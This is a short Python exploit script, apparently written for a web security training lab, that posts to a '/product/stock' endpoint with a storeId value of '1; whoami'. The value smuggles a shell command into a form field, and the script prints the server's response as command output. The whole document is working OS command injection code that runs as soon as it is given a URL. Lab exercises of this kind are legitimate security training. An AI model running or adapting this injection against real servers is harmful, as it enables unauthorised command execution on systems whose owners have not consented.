import requests
session = requests.session()

base_url = input("Enter the lab URL: ").strip().rstrip("/")
target_url = f"{base_url}/product/stock"

payload = {
    "productId": "1",
    "storeId": "1; whoami"
}
try:
    response = session.post(target_url, data = payload, timeout=10)
except requests.RequestException as e:
    print(f"[*] Connection failed: {e}")
    exit(1)

if response.status_code == 200:
    print("[*] Command executed successfully!")
    print(f"[*] Output:\n{response.text.strip()}")
else:
    print(f"[*] Exploit failed. HTTP Status: {response.status_code}")
